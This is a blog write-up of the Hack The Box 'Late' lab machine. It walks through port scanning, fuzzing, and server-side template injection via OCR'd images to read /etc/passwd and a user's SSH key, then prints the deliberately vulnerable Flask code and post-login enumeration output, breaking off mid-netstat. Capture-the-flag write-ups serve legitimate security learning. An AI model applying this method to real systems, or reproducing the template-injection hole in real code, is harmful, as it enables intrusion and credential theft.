<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HTB Late" /><meta property="og:locale" content="en" /><meta name="description" content="Ethical hacking blog and technical documentation." /><meta property="og:description" content="Ethical hacking blog and technical documentation." /><link rel="canonical" href="https://naosinfosec.com/posts/htb-late/" /><meta property="og:url" content="https://naosinfosec.com/posts/htb-late/" /><meta property="og:site_name" content="NaosInfoSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-03T16:55:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB Late" /><meta name="twitter:site" content="@Raiskv" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-25T11:57:46+01:00","datePublished":"2022-08-03T16:55:00+02:00","description":"Ethical hacking blog and technical documentation.","headline":"HTB Late","mainEntityOfPage":{"@type":"WebPage","@id":"https://naosinfosec.com/posts/htb-late/"},"url":"https://naosinfosec.com/posts/htb-late/"}</script><title>HTB Late | NaosInfoSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="NaosInfoSec"><meta name="application-name" content="NaosInfoSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/naos.svg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">NaosInfoSec</a></div><div class="site-subtitle font-italic">Technology and Ethical hacking blog.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/raiabril" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Raiskv" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['grx6','naosinfosec.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Late</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HTB Late</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1659538500" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 3, 2022 </em> </span> <span> Updated <em class="" data-ts="1679741866" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 25, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/Raiskv">Rai Abril</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3859 words"> <em>21 min</em> read</span></div></div></div><div class="post-content"><p><a href="https://www.hackthebox.com/storage/avatars/a9b92307fbcfa1472607067909a2bccf.png" class="popup img-link "><img data-src="https://www.hackthebox.com/storage/avatars/a9b92307fbcfa1472607067909a2bccf.png" alt="late-htb" class="lazyload" data-proofer-ignore></a></p><h2 id="reconnaissanceintelligence-gathering"><span class="mr-2">Reconnaissance/Intelligence Gathering</span><a href="#reconnaissanceintelligence-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this step we collect the target information available in public repositories or sources. We do everything passively.</p><h2 id="scanning-and-enumeration"><span class="mr-2">Scanning and enumeration</span><a href="#scanning-and-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now itâ€™s time to start the active scanning.</p><p>As always, we define our TARGET and hosts file of our machine to facilitate the process.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">TARGET=&lt;ip_of_the_machine&gt;</span><span class="w">
</span><span class="gp">sudo nano /etc/hosts #</span><span class="w"> </span>Add a line with the machine IP /t late.htb
</pre></table></code></div></div><p>We launch a single <code class="language-plaintext highlighter-rouge">TCMP</code> probe to check ping.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">ping -c 1 $</span>TARGET		<span class="c"># =&gt; Ping is working</span>
</pre></table></code></div></div><h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To scan the <code class="language-plaintext highlighter-rouge">target</code> to find open ports and possible vulnerabilities we use <code class="language-plaintext highlighter-rouge">nmap</code>.</p><p>First, simple <code class="language-plaintext highlighter-rouge">TCP</code> scan without <code class="language-plaintext highlighter-rouge">DNS</code> resolution and ping discovery, to all the ports and with the version detection.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">nmap -n -Pn -sV -p- $</span>TARGET <span class="nt">-vvv</span> <span class="nt">-oG</span> allPorts
<span class="go">
PORT   STATE SERVICE REASON  VERSION
</span><span class="gp">22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Then we launch the standard scripts in the ports open but nothing shows.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">nmap -n -Pn -sVC -p22,80 $</span>TARGET <span class="nt">-oN</span> targeted
<span class="go">
</span></pre></table></code></div></div><p>We launch also a UDP scan.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">sudo nmap -n -Pn -sV -sU -p- $</span>TARGET <span class="nt">-vvv</span> <span class="nt">-oG</span> allPortsUDP
</pre></table></code></div></div><h4 id="directory-fuzzing"><span class="mr-2">Directory fuzzing</span><a href="#directory-fuzzing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://late.htb/FUZZ
</span></pre></table></code></div></div><p>We find assets (normal stuff in a website).</p><h4 id="subdomain"><span class="mr-2">Subdomain</span><a href="#subdomain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Visiting the site we see that there is already a link to <em><a href="http://images.late.htb">http://images.late.htb</a></em>. We can add it also to the <code class="language-plaintext highlighter-rouge">hosts</code> file.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">echo '10.10.11.156 images.late.htb' | sudo tee -a /etc/hosts
</span></pre></table></code></div></div><p>The site is a flask utility to convert images to text. This is a nice project by <a href="https://github.com/lucadibello/ImageReader">lucadibello</a>.</p><p>We can do some random tests with images with text to verify that after clicking in <code class="language-plaintext highlighter-rouge">SCAN</code> the application is using OCR <code class="language-plaintext highlighter-rouge">tesseract</code> to read the text in the image.</p><h2 id="gaining-access"><span class="mr-2">Gaining access</span><a href="#gaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To gain access to the system, the test consists in using template injection in the text that the application is reading <code class="language-plaintext highlighter-rouge">SSTI</code>. The repo from <em>luca</em> is not vulnerable but we will try.</p><p>The process consists in crafting an image with the ``.</p><p>After a lot of trial and error and following hacktricks recommendations I managed to get the <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p><p><a href="/assets/img/posts/htb-late-cat-etc-passwd.png" class="popup img-link "><img data-src="/assets/img/posts/htb-late-cat-etc-passwd.png" alt="htb-late-cat-etc-passwd" class="lazyload" data-proofer-ignore></a></p><p>And then we try to obtain the ssh key from the user with login (<code class="language-plaintext highlighter-rouge">svc_acc</code>)</p><p><a href="/assets/img/posts/htb-late-rsa.png" class="popup img-link "><img data-src="/assets/img/posts/htb-late-rsa.png" alt="htb-late-rsa" class="lazyload" data-proofer-ignore></a></p><p>Like always we must set the correct permissions to our <code class="language-plaintext highlighter-rouge">id_rsa</code> file.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">chmod 400 id_rsa
ssh -i id_rsa svc_acc@late.htb
</span></pre></table></code></div></div><h2 id="internal-reconnaissance"><span class="mr-2">Internal reconnaissance</span><a href="#internal-reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>User flag can be obtained directly from the home of the user. We can see that we have an <code class="language-plaintext highlighter-rouge">app</code> folder in the home directory that it is running the web application.</p><p>Here we can see the code that is vulnerable to SSTI.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="n">os</span><span class="p">,</span> <span class="n">random</span>
<span class="kn">from</span> <span class="n">flask.templating</span> <span class="kn">import</span> <span class="n">render_template_string</span>
<span class="kn">from</span> <span class="n">werkzeug.utils</span> <span class="kn">import</span> <span class="n">secure_filename</span>
<span class="kn">import</span> <span class="n">PIL.Image</span>
<span class="kn">import</span> <span class="n">pytesseract</span>
<span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">send_file</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">upload_dir</span> <span class="o">=</span> <span class="s">"/home/svc_acc/app/uploads"</span>
<span class="n">misc_dir</span> <span class="o">=</span> <span class="s">'/home/svc_acc/app/misc'</span>
<span class="n">allowed_extensions</span> <span class="o">=</span>  <span class="p">[</span><span class="s">"jpg"</span> <span class="p">,</span><span class="s">'png'</span><span class="p">]</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'_5#y2L"F4Q8z</span><span class="se">\n\xec</span><span class="s">]/'</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s">"Image Reader"</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s">'/scanner'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">scan_file</span><span class="p">():</span>
    <span class="n">scanned_text</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">results</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">start_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">()</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span>
        
        <span class="k">if</span> <span class="n">f</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">allowed_extensions</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">ID</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">))</span>
                <span class="n">file_name</span> <span class="o">=</span> <span class="n">upload_dir</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="nf">secure_filename</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">filename</span> <span class="p">)</span><span class="o">+</span> <span class="n">ID</span>
                <span class="n">f</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
                <span class="n">pytesseract</span><span class="p">.</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">tesseract_cmd</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'/usr/bin/tesseract'</span>
                <span class="n">scanned_text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="p">.</span><span class="nf">image_to_string</span><span class="p">(</span><span class="n">PIL</span><span class="p">.</span><span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">))</span>

                <span class="n">results</span> <span class="o">=</span> <span class="s">"""&lt;p&gt;{}&lt;/p&gt;"""</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">scanned_text</span><span class="p">)</span>

                <span class="n">r</span> <span class="o">=</span> <span class="nf">render_template_string</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
                <span class="n">path</span> <span class="o">=</span> <span class="n">misc_dir</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">ID</span> <span class="o">+</span> <span class="s">'_'</span> <span class="o">+</span> <span class="s">'results.txt'</span>
            
                <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

                <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">attachment_filename</span><span class="o">=</span><span class="s">'results.txt'</span><span class="p">)</span>

            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="nf">return </span><span class="p">(</span><span class="s">'Error occured while processing the image: '</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="s">'Invalid Extension'</span>


</pre></table></code></div></div><p>I like to execute <code class="language-plaintext highlighter-rouge">linpeas.sh</code> to explore the machine.</p><h3 id="host"><span class="mr-2">Host</span><a href="#host" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="go">id
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

whoami
svc_acc

sudo -l
[sudo] password for svc_acc:

hostname
late

ifconfig
</span><span class="gp">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;</span><span class="w">  </span>mtu 1500
<span class="go">        inet 10.10.11.156  netmask 255.255.254.0  broadcast 10.10.11.255
</span><span class="gp">        inet6 dead:beef::250:56ff:feb9:a38  prefixlen 64  scopeid 0x0&lt;global&gt;</span><span class="w">
</span><span class="gp">        inet6 fe80::250:56ff:feb9:a38  prefixlen 64  scopeid 0x20&lt;link&gt;</span><span class="w">
</span><span class="go">        ether 00:50:56:b9:0a:38  txqueuelen 1000  (Ethernet)
        RX packets 92021  bytes 9382261 (9.3 MB)
        RX errors 0  dropped 38  overruns 0  frame 0
        TX packets 86720  bytes 14758043 (14.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

</span><span class="gp">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;</span><span class="w">  </span>mtu 65536
<span class="go">        inet 127.0.0.1  netmask 255.0.0.0
</span><span class="gp">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><span class="w">
</span><span class="go">        loop  txqueuelen 1000  (Local Loopback)
        RX packets 85257  bytes 10350294 (10.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 85257  bytes 10350294 (10.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

</span></pre></table></code></div></div><h3 id="network"><span class="mr-2">Network</span><a href="#network" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="go">mount

sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=987732k,nr_inodes=246933,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204116k,mode=755)
/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14470)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
/dev/sda2 on /boot type ext4 (rw,relatime,data=ordered)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204112k,mode=700,uid=1000,gid=1000)
</span></pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="go">netstat -nlp

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
